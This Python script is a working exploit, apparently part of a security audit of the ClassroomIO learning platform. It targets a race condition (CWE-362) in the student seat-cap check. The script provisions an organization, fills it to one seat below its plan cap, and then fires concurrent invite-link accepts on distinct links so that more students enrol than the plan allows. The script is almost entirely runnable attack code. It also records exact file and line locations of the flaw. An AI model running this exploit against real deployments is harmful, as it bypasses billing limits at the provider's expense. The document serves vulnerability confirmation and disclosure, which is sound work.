#!/usr/bin/env python3
"""
VULN-029 (F-45) — Seat/plan-cap over-provision race (FOR UPDATE lock not threaded into insert).

Vulnerable code (targets/classroomio/):
  * apps/api/src/services/organization/student-limit.ts:86-131 — assertStudentCapacityOrThrow
        takes `dbClient: DbOrTxClient = db` (defaults to autocommit `db`), so the
        SELECT ... FOR UPDATE org-row lock is released before the caller's separate insert.
  * caller apps/api/src/services/invite-link/invite-link.ts:242 — inside a db.transaction(tx)
        it calls assertStudentCapacityOrThrow(organizationId, 1) WITHOUT passing `tx`, so
        the capacity check runs on a different (autocommit) connection than the member insert.

Class: CWE-362 race condition / TOCTOU (billing/seat-integrity).

The flaw: the Free (BASIC) plan caps a workspace at 20 active students
(STUDENT_LIMITS.BASIC). Enrolment checks the count under a row lock, but the lock is not
held across the subsequent membership insert, so K concurrent joiners that all pass the
"count < cap" check when one seat remains all insert — pushing the org past its cap.

Exploitation idea: bring a fresh org to cap-1 active students, then fire K concurrent
share-link accepts; more than one succeeds and the active count exceeds the cap.

NOTE: this needs a capped (non-Enterprise) org. The main audit org was seeded to ENTERPRISE
(unlimited) by another batch, so this exploit provisions a FRESH org (cloud mode allows it;
a fresh org has no plan row → BASIC cap 20).

A successful run proves: active student count > plan cap after a concurrent-join burst.
"""
import os
import sys
import threading
import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (log, banner, verdict, signup, create_course, course_share_link,  # noqa: E402
                     psql, rid, API, BASE_URL)

VULN = "VULN-029"
CAP = int(os.environ.get("CAP", "20"))          # STUDENT_LIMITS.BASIC = 20 (plans/constants.ts:70)
BURST = int(os.environ.get("BURST", "8"))        # concurrent joiners racing for the last seat
FILL_CAP = int(os.environ.get("FILL_CAP", "40"))  # safety bound on sequential fill


def active_students(org_id):
    n = psql(f"select count(*) from organizationmember where organization_id='{org_id}' "
             f"and role_id=3 and (status is null or status='ACTIVE');")
    try:
        return int(n)
    except Exception:
        return -1


def main():
    banner(VULN, "Seat/plan-cap over-provision race")
    log("INFO", "student-limit.ts:86-131 locks the org row but on autocommit `db`; invite-link.ts:242")
    log("INFO", "calls it without the accept `tx` → lock released before the member insert")

    # Fresh capped org (cloud onboarding → no plan row → BASIC cap 20).
    log("SETUP", "provision a FRESH org (no plan → Free/BASIC cap=%d)" % CAP)
    admin_v = signup(label="capadmin")
    sn = "cap" + rid()[-6:]
    r = admin_v.post("/onboarding/create-org", json={"fullname": "Cap Admin", "orgName": "Cap " + sn, "siteName": sn})
    if r.status_code not in (200, 201):
        verdict(VULN, "FAILED", f"could not create fresh org: {r.status_code}")
        log("FAIL", r.text[:200])
        sys.exit(1)
    org_v = r.json()["data"]["organization"]["id"]
    log("SETUP", f"fresh org={org_v}")

    course = create_course(admin_v, org_id=org_v)
    token = course_share_link(admin_v, course["id"], org_id=org_v)
    log("SETUP", f"course={course['id']} share-link token={token[:10]}…")

    def enroll_one(org_id):
        u = signup(org_id=org_id, label="joiner")
        rr = u.post(f"/invite/r/{token}/accept", json={})
        return rr.status_code

    # Fill sequentially to cap-1 (one seat remaining).
    log("STEP", f"filling the org to {CAP-1} active students (one seat left)")
    filled = 0
    for _ in range(FILL_CAP):
        cur = active_students(org_v)
        if cur >= CAP - 1:
            break
        sc = enroll_one(org_v)
        if sc not in (200, 201):
            log("INFO", f"  sequential enroll returned {sc} at active={cur}")
            break
        filled += 1
    cur = active_students(org_v)
    log("INFO", f"  active students now = {cur} (target cap-1 = {CAP-1})")

    if cur < CAP - 1:
        verdict(VULN, "NEEDS_MANUAL", f"could not fill to cap-1 (stuck at {cur}); see notes")
        log("FAIL", "fill did not reach cap-1")
        sys.exit(1)

    # Each racer must use a DISTINCT invite link: acceptInviteLink locks the invite row
    # (lockInviteLinkForAccept, invite-link.ts:229) inside its tx, so same-token accepts
    # serialize on that lock. Distinct links → only the org-row capacity FOR UPDATE
    # (run on autocommit `db`, released before the insert) contends → the race fires.
    log("SETUP", f"creating {BURST} DISTINCT course share-links + {BURST} joiner accounts")
    joiners = []  # (cookies, distinct_token)
    for _ in range(BURST):
        c2 = create_course(admin_v, org_id=org_v)
        tok2 = course_share_link(admin_v, c2["id"], org_id=org_v)
        u = signup(org_id=org_v, label="race")
        joiners.append((u.s.cookies.get_dict(), tok2))

    # Fire BURST concurrent accepts on DISTINCT links — only ONE seat remains.
    log("STEP", f"firing {BURST} concurrent accepts (distinct links) with 1 seat remaining")
    results = {}

    def worker(i, cookies, tok):
        s = requests.Session()
        s.cookies.update(cookies)
        try:
            rr = s.post(f"{API}/invite/r/{tok}/accept", json={}, headers={"Origin": BASE_URL}, timeout=30)
            results[i] = rr.status_code
        except Exception as e:
            results[i] = f"err:{e}"

    threads = [threading.Thread(target=worker, args=(i, c, tok)) for i, (c, tok) in enumerate(joiners)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    ok = sum(1 for v in results.values() if v in (200, 201))
    final = active_students(org_v)
    log("INFO", f"  concurrent accept statuses: {sorted(results.items())}")
    log("INFO", f"  {ok}/{BURST} accepts succeeded; final active students = {final} (cap={CAP})")

    here = os.path.dirname(os.path.abspath(__file__))
    with open(os.path.join(here, "response.txt"), "w") as f:
        f.write(f"org={org_v} cap={CAP}\nfilled to active={cur} (cap-1)\n")
        f.write(f"burst statuses: {sorted(results.items())}\n")
        f.write(f"{ok}/{BURST} succeeded; final active={final}\n")

    if final > CAP:
        log("PROOF", f"final active students = {final} > plan cap {CAP}; {ok} joiners passed the capacity "
                     f"check for a single remaining seat (lock not held across the insert) → over-provision")
        verdict(VULN, "CONFIRMED", f"seat cap {CAP} exceeded (active={final}) via concurrent-join race")
        log("OK", "exploit confirmed — plan seat cap bypassed by TOCTOU race")
        sys.exit(0)

    verdict(VULN, "NEEDS_MANUAL", f"final active={final} did not exceed cap {CAP} this run (race may have serialized)")
    log("FAIL", "no over-provision observed; retry (races are probabilistic) — see notes")
    sys.exit(1)


if __name__ == "__main__":
    main()
